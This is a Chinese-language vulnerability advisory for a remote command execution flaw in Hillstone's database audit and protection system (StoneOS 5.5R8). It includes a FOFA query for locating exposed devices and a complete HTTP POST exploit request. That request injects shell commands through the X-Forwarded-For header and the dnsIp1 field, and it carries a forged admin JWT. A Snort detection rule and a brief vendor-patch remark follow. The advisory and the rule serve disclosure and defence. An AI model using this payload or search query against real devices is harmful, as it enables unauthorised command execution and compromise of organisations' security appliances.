# 山石网科数据库审计与防护系统saveservicecfgset存在远程命令执行漏洞

山石网科数据库审计与防护系统saveservicecfgset存在远程命令执行漏洞

# 影响版本

StoneOS 5.5R8

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa:**  body="css/theme/theme_default.css"

**POC/EXP：**

**step1 延时注入**

```
POST /systemConfig/saveservicecfgset HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive
sec-ch-ua-platform: "Windows"
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: */*
sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"
sec-ch-ua-mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
x-forwarded-for: 127.0.0.1;id>whoami>/home/realstone/web/webapps/ROOT/js/yy.txt;#
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Cookie: jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlN5c0FkbWluIiwicm9sZUlkIjoxLCJleHAiOjE3ODkxMjE2MTJ9.Herl_TXCPc3no1rMug9cigLXyh0n183TJ_O-9qcTr9M
Content-Type: application/x-www-form-urlencoded
Content-Length: 88

id=1&dnsIp1=;ping DNSlog-IP&dnsIp2=1.1.1.1&dnsIp3=1.1.1.1&webRule=0&webPort=443&sshRule=0&sshPort=22&haRule=1&haIps=&sshStatus=1
```

​![image](assets/image-20260911171659-zuw3ohm.png)​

**sonrt规则：**

```
alert http any any -> $HOME_NET any (
    msg:"山石网科数据库审计与防护系统 - /systemConfig/saveservicecfgset x-forwarded-for 命令注入";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/systemConfig/saveservicecfgset"; fast_pattern;
    http.header;
        content:"x-forwarded-for";
        nocase;
        content:";";
        distance:0;
        within:100;
    metadata:
        service http,
        affected_product "山石网科数据库审计与防护系统",
        vulnerability_type "Remote Command Execution (Command Injection)",
        severity "critical";
    classtype:web-application-attack;
    sid:1000729;
    rev:1;
    priority:1;
)
```

# 漏洞修复

* **联系山石网科官方**获取针对该漏洞的安全补丁或升级版本。

‍
